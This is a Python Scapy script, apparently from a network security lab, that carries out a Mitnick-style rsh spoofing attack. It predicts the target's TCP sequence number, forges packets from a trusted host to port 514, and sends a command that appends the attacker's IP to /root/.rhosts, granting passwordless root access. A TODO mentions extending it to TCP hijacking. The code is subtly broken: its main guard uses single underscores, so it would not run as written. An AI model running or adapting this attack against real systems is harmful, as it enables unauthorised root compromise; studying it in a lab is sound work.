from scapy.all import *

import sys
import time


if _name_ == "_main_":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3] 
    attacker_ip = get_if_addr(conf.iface)
    payload = "root\0root\0echo '"+attacker_ip+" root'"+">> /root/.rhosts\0"
    #payload = "echo '"+attacker_ip+" root'"+">> /root/.rhosts\0"
    payload = str.encode(payload)
    print(payload)

    sport = random.randint(1024,60000)
    #########p1 is used to get the current sequence number(src_ip is attacker)#############
    p1 = IP(dst=target_ip)/TCP(sport=sport,dport=514,flags="S")
    time.sleep(1)
    #RTT_start = time.time()
    SYNACK = sr1(p1,verbose=0)
    #RTT_time = time.time()-RTT_start
    print("time:",time.time())
    print("SEQ:",SYNACK.seq)
    p0 = IP(dst=target_ip)/TCP(sport=sport,dport=514,flags="R")
    send(p0,verbose=0)
    #########p2 is used to send to the target pretending being the trusted_host(SYN)########### 
    sport = random.randint(1024,60000)
    p2 = IP(dst=target_ip,src=trusted_host_ip)/TCP(sport=sport, dport=514, flags='S')
    send(p2,verbose=0)
    predict_seq = 64000+SYNACK.seq
    print("predict:",predict_seq)
    time.sleep(5)

    p3 = IP(dst=target_ip,src=trusted_host_ip)/TCP(sport=sport, dport=514, flags='A', seq=1, ack=predict_seq+1)
    send(p3)
    p4 = IP(dst=target_ip,src=trusted_host_ip)/TCP(sport=sport, dport=514, flags='P', seq=1, ack=predict_seq+1)/Raw(load=payload)
    send(p4)
    time.sleep(1)
    p0 = IP(dst=target_ip,src=trusted_host_ip)/TCP(sport=sport,dport=514,flags="R")
    send(p0)
    #TODO: TCP hijacking with predicted sequence number